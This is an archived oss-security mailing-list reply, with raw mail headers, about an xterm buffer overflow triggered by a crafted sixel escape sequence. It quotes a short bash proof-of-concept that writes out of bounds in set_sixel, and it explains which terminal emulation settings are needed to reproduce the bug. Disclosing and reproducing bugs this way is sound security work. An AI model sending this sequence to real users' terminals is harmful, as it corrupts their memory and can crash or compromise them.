X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["827" "Monday" "31" "January" "2022" "11:48:15" "+0100" "Jakub Wilk" "jwilk@jwilk.net" nil "26" "Re: [oss-security] Re: xterm buffer overflow via crafted sixel" nil nil nil "1" nil nil (number mark "U       jwilk@jwilk. Jan 31   26/827   " thread-indent "\"Re: [oss-security] Re: xterm buffer overflow via crafted sixel\"\n") nil nil nil nil nil nil nil nil nil "Re: [oss-security] Re: xterm buffer overflow via crafted sixel" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 22503 invoked by uid 550); 31 Jan 2022 10:48:31 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 22485 invoked from network); 31 Jan 2022 10:48:30 -0000
Authentication-Results: garm.ovh; auth=pass (GARM-101G00423779c2a-563e-4c3d-a556-b2082c634a02,
                    78AFBC7AF3FE9A51DBE06DAB76C8A3FD80C38B61) smtp.auth=jwilk@jwilk.net
X-OVh-ClientIp: 188.146.50.88
Date: Mon, 31 Jan 2022 11:48:15 +0100
From: Jakub Wilk <jwilk@jwilk.net>
To: <oss-security@lists.openwall.com>
Message-ID: <20220131104815.qc2gwh7jrf7zjl4f@jwilk.net>
Mail-Followup-To: oss-security@lists.openwall.com
References: <YfbKimj0O33X9f7v@schwarzgerat.orthanc>
 <st6m04$ked$1@ciao.gmane.io>
MIME-Version: 1.0
Content-Type: text/plain; charset="us-ascii"; format=flowed
Content-Disposition: inline
In-Reply-To: <st6m04$ked$1@ciao.gmane.io>
X-Originating-IP: [37.59.142.101]
X-ClientProxiedBy: DAG1EX2.mxp6.local (172.16.2.2) To DAG4EX2.mxp6.local
 (172.16.2.32)
X-Ovh-Tracer-GUID: bbf01caf-59fd-4a70-bbef-7f7cef7bb91b
X-Ovh-Tracer-Id: 13723312489933756183
X-VR-SPAMSTATE: OK
X-VR-SPAMSCORE: 0
X-VR-SPAMCAUSE: gggruggvucftvghtrhhoucdtuddrgedvvddrgedugddvtdcutefuodetggdotefrodftvfcurfhrohhfihhlvgemucfqggfjpdevjffgvefmvefgnecuuegrihhlohhuthemucehtddtnecunecujfgurhepfffhvffukfhfgggtuggjihesthdtredttddtvdenucfhrhhomheplfgrkhhusgcuhghilhhkuceojhifihhlkhesjhifihhlkhdrnhgvtheqnecuggftrfgrthhtvghrnhepfffhuddvteefgedthfffgeeilefhteefffeiheetvdehjeeihefhvdfhtddtueffnecuffhomhgrihhnpehinhhvihhsihgslhgvqdhishhlrghnugdrnhgvthenucfkpheptddrtddrtddrtddpfeejrdehledrudegvddruddtudenucevlhhushhtvghrufhiiigvpedtnecurfgrrhgrmhepmhhouggvpehsmhhtphhouhhtpdhhvghlohepmhigphhlrghniedrmhgrihhlrdhovhhhrdhnvghtpdhinhgvtheptddrtddrtddrtddpmhgrihhlfhhrohhmpehjfihilhhksehjfihilhhkrdhnvghtpdhnsggprhgtphhtthhopedupdhrtghpthhtohepohhsshdqshgvtghurhhithihsehlihhsthhsrdhophgvnhifrghllhdrtghomh
Subject: Re: [oss-security] Re: xterm buffer overflow via crafted sixel

* Tavis Ormandy <taviso@gmail.com>, 2022-01-30, 18:39:
>I can repro here, here is a testcase:
>
>#!/bin/bash
>printf "\ePq"
>printf "#%hhu;2;%hhu;%hhu;%hhu" 0x41 100 100 100
>printf "#%hhu!%u@" 0x41 0x7fffffff
>printf "#%hhu!%u@" 0x41 0x7fffffff
>printf "\e\\"
>
>That should wrap context->col, and write a 'A' to graphic->pixels oob in
>set_sixel.
>
>I use `XTerm*decTerminalID: vt382` in .Xresources, not sure if that matters.

I think it does. 
https://invisible-island.net/xterm/ctlseqs/ctlseqs.html#h3-Sixel-Graphics 
says "xterm [needs to be] configured as VT240, VT241, VT330, VT340 or 
VT382" for Sixels to be supported. And indeed, I can't reproduce the bug 
with the default emulation level (VT420).

If you don't want to tinker with your .Xresources for testing, you can 
use the -ti option instead.

-- 
Jakub Wilk
